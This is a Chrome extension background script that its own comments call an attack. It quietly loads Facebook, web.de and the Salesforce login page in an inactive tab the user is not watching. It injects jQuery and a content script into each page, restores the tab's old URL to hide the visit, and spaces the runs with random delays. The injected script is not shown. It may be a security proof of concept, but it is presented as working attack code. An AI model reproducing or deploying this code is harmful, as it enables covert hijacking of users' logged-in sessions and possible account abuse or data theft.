var urls = ['https://facebook.com', 'http://web.de', 'https://login.salesforce.com/'];

// Store old url of tab to change the tab back to it.
var oldUrl;

// Listen for messages from content script
chrome.runtime.onMessage.addListener(function(message, sender) {
	
	// If message origins from tab and message status is 'finished' ,
	// change tab back to old web page and execute next attack.
	if(sender.tab && message.status === 'finished') {
		chrome.tabs.update(sender.tab.id, {url: oldUrl});
		executeAttack();
	}
});

function openPageInInactiveTab(url) {

	// Options to query a tab. Tab is not active and not a browser intern window.
	var queryOptions = {
		active: false,
		windowType: "normal"
	}
	
	// Query tabs
	chrome.tabs.query(queryOptions, function (tabs) {		
		if(tabs.length === 0) {
			return;
		}
	
		// Store current URL of tab
		oldUrl = tabs[0].url;
		
		// Load target web page in tab
		chrome.tabs.update(tabs[0].id, {url: url}, function(tab) {
			
			// Wait until tab has finished loading
			var interval = setInterval(function() {
				chrome.tabs.get(tab.id, function(tab) {
					if(tab.status === 'complete') {
						clearInterval(interval);
						
						// Execute content scripts
						chrome.tabs.executeScript(tab.id, {file: 'jquery.js'});
						chrome.tabs.executeScript(tab.id, {file: 'content.js'});
					}
				});
			}, 100);
		});
	});
}

// Execute next attack delayed 
function executeAttack() { 
	setTimeout(function() {
		if(urls.length > 0) {
			openPageInInactiveTab(urls.pop());	
		}
	}, Math.random() * 10000);
}

// Execute first attack
executeAttack();